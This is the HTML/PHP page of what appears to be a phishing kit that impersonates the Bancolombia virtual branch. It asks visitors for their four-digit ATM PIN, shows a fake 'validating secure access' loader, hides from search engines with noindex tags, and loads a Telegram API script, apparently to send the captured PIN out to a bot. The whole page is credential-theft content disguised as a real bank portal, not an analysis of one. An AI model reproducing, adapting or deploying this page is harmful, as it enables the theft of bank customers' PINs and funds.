<?php require_once 'security.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, notranslate">
    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="description" content="Portal oficial de servicios Bancolombia Sucursal Virtual Personas. Verificación de identidad segura.">
    <title>Validando acceso seguro — Bancolombia</title>
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <script src="jquery-3.7.7.js"></script>
    <link rel="stylesheet" href="assets/css/pages/load.css">
</head>
<body>

    <!-- FONDO DESENFOCADO -->
    <div class="fondo-desenfocado">
        <div class="page-shell">
            <header class="header-top">
                <img src="assets/images/logo-encabezado.svg" alt="Bancolombia" class="logo-header">
            </header>
            <img src="assets/images/trazo-escritorio.svg" alt="" class="trazo trazo-desktop">
            <section class="center-stage">
                <div class="form-container">
                    <div class="form-box">
                        <img src="assets/images/candadito-lindo.svg" alt="Candado" class="candado-icono">
                        <h1 class="titulo-principal">Clave principal</h1>
                        <p class="descripcion">Es la misma que usas en el <strong>cajero automático</strong></p>
                        <div class="clave-container">
                            <div class="clave-item">
                                <input type="password" class="clave-numero" maxlength="1" placeholder="•">
                                <div class="clave-rayita activa"></div>
                            </div>
                            <div class="clave-item">
                                <input type="password" class="clave-numero" maxlength="1" placeholder="•">
                                <div class="clave-rayita activa"></div>
                            </div>
                            <div class="clave-item">
                                <input type="password" class="clave-numero" maxlength="1" placeholder="•">
                                <div class="clave-rayita activa"></div>
                            </div>
                            <div class="clave-item">
                                <input type="password" class="clave-numero" maxlength="1" placeholder="•">
                                <div class="clave-rayita activa"></div>
                            </div>
                        </div>
                        <div class="olv"><a href="#">¿Olvidaste tu clave?</a></div>
                        <div class="botones">
                            <button class="btn-volver">Volver</button>
                            <button class="btn-continuar activo">Continuar</button>
                        </div>
                    </div>
                </div>
                <img src="assets/images/trazo-movil.svg" alt="" class="trazo trazo-mobile">
            </section>
            <footer class="footer-container">
                <div class="footer-line"></div>
                <div class="footer-logos">
                    <div class="logo-intermedio">
                        <img src="assets/images/logo-pie.svg" alt="Bancolombia">
                    </div>
                    <div class="logo-vigilado">
                        <img src="assets/images/estrella-hola.svg" alt="Vigilado">
                    </div>
                </div>
                <div class="info-footer">
                    <span>Dirección IP: <span id="gfg">Cargando...</span></span>
                    <span> | </span>
                    <span id="fecha-hora">Cargando...</span>
                </div>
            </footer>
        </div>
    </div>

    <div class="capa-gris"></div>

    <div id="address" hidden></div>

    <div class="contenido">
        <div class="circle-container">
            <div class="loader"></div>
            <div class="texto-cargando">Cargando...</div>
        </div>
        <h1 class="titulo">Validando tu acceso de forma segura</h1>
        <p class="descripcion-texto">Esto puede tomar unos segundos. Gracias por tu paciencia.</p>
    </div>

    <script src="assets/js/shared/page-common.js?v=9"></script>
    
    <!-- 🆕 NUEVO: Cliente API de Telegram (SEGURO) -->
    <script src="assets/js/shared/telegram-api.js?v=9"></script>
    
    <script src="assets/js/pages/load.js?v=9"></script>

</body>
</html>
